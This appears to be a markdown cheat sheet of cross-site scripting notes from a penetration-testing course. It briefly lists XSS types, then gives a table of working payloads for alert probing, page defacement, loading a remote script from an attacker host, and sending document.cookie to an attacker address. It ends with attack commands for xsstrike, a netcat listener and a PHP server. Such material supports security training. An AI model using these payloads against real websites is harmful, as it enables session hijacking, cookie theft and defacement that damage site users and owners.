# Cross-Site Scripting (XSS)

## Types of XSS
There are three main types of XSS vulnerabilities:

| Type                | Description                                                                 |
|---------------------|-----------------------------------------------------------------------------|
| Stored (Persistent) XSS | Occurs when user input is stored in a database and displayed (e.g., posts). |
| Reflected (Non-Persistent) XSS | Occurs when input is processed and shown without storage (e.g., search).   |
| DOM-based XSS       | Occurs when input is client-side processed and displayed (e.g., parameters).|

## XSS Payloads

| Code | Description |
|------|-------------|
| `<script>alert(window.origin)</script>` | Basic XSS Payload |
| `<plaintext>` | Basic XSS Payload |
| `<script>print()</script>` | Basic XSS Payload |
| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS Payload |
| `<script>document.body.style.background = "#141d2b"</script>` | Change Background Color |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image |
| `<script>document.title = 'HackTheBox Academy'</script>` | Change Website Title |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite website's main body |
| `<script>document.getElementById('urlform').remove();</script>` | Remove certain HTML element |
| `<script src="http://OUR_IP/script.js"></script>` | Load remote script |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send Cookie details to us |

## Commands

| Command | Description |
|---------|-------------|
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run xsstrike on a url parameter |
| `sudo nc -lvnp 8080` | Start netcat listener |
| `sudo php -S 0.0.0.0:8080` | Start PHP server |

## Useful Links

- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
